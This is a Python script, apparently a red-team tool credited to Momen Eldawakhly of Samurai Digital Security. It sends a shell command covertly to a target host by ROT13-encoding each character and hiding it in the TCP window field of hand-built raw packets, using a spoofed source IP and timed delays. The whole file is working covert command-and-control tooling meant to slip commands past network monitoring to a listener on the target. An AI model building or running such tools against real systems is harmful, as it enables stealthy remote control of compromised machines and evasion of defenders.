import struct
import array
import socket
import time
import random
import argparse
import codecs
import base64
from colorama import Fore

Reset = Fore.RESET
Red = Fore.RED
Green = Fore.GREEN
Cyan = Fore.CYAN

argParser = argparse.ArgumentParser()
argParser.add_argument("-c", "--command", help="Command to execute")
argParser.add_argument("-t", "--target", help="Target IP")
argParser.add_argument("-dp", "--dst-port", help="Destination port", type=int, default=72)
argParser.add_argument("-d", "--delay", help="Seconds to delay between packets, the more seconds, the more stable connection.")
argParser.add_argument("-s", "--source", help="Source IP")
argParser.add_argument("-p", "--port", help="Source port", type=int)
args = argParser.parse_args()
command = args.command
target = args.target
dst_port = args.dst_port
delay = args.delay
src_ip = args.source
src_port = args.port

def ascii():
    art = """
                     .  WCE
                    / V\\
                  / `  /
                 <<   |
                 /    |
               /      |
             /        |
           /    \  \ /
          (      ) | |
  ________|   _/_  | |
<__________\______)\__)\n
- Created by Momen Eldawakhly (Cyber Guy)
-- Samurai Digital Security
    """
    print(art)

class TCPPacket:
    def __init__(self,
                 src_host,
                 src_port,
                 dst_host,
                 dst_port,
                 window,
                 flags=0):
        self.src_host = src_host
        self.src_port = src_port
        self.dst_host = dst_host
        self.dst_port = dst_port
        self.window = window
        self.flags = flags

    def build(self):
        packet = struct.pack(
            '!HHIIHHHH',
            self.src_port,        # Source Port
            self.dst_port,        # Destination Port
            random.randint(0, 2**32 - 1),  # Sequence Number
            random.randint(0, 2**32 - 1),  # Acknowledgment Number
            5 << 12 | 0b110000,   # Data Offset + Flags
            self.window,          # Window
            0,                    # Checksum (initial value)
            0                     # Urgent pointer
        )

        # Pseudo header for checksum calculation
        pseudo_hdr = struct.pack(
        '!4s4sHH',
        socket.inet_aton(self.src_host),    # Source Address
        socket.inet_aton(self.dst_host),    # Destination Address
        socket.IPPROTO_TCP,                 # Protocol ID
        len(packet)                         # TCP Length
        )

        def chksum(packet):
                if len(packet) % 2 != 0:
                    packet += b'\0'
                res = sum(array.array("H", packet))
                res = (res >> 16) + (res & 0xffff)
                res += res >> 16
                return (~res) & 0xffff

        checksum = chksum(pseudo_hdr + packet)
        packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
        return packet

dst = target
if command == None:
    ascii()
    print(f"{Red}[-] Please specify IP to command. {Reset}".format())
elif delay == None:
    ascii()
    print(f"{Red}[-] Please specify time to delay. {Reset}".format())
elif src_ip == None:
    ascii()
    print(f"{Red}[-] Please specify source IP. {Reset}".format())
elif src_port == None:
    print(f"{Red}[-] Please specify source port. {Reset}".format())
else:
    ascii()
    print(Green + f"[+] Target: {Cyan + target + Reset}".format())
    print(Green + f"[+] Command: {Cyan + command + Reset}".format())
    print(Green + f"[+] Time to delay: {Cyan + delay + Reset}\n\n".format())

    with open("./cmd.sh", "w") as cm:
        cm.write(command)
    with open("./cmd.sh", "r") as fi:
        fi = fi.read()
    print(Green + f"[+] Unpacking {Cyan + command + Green} to be sent. {Reset}".format())
    unpacked = [*fi]
    print(Green + f"[+] Sending {Cyan + command + Reset + Green} with { Cyan + delay + Reset + Green} seconds to delay. {Reset}".format())

    for char in unpacked:
        char = codecs.encode(char, 'rot_13')
        char_val = ord(char)
        pak = TCPPacket(
            src_ip,
            src_port,
            dst,
            dst_port,
            char_val
        )
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.sendto(pak.build(), (dst, 0))
        delay = int(delay)
        time.sleep(delay)
        print(Green + f"[+] Command {Cyan + command + Reset + Green} sent. {Reset}".format())
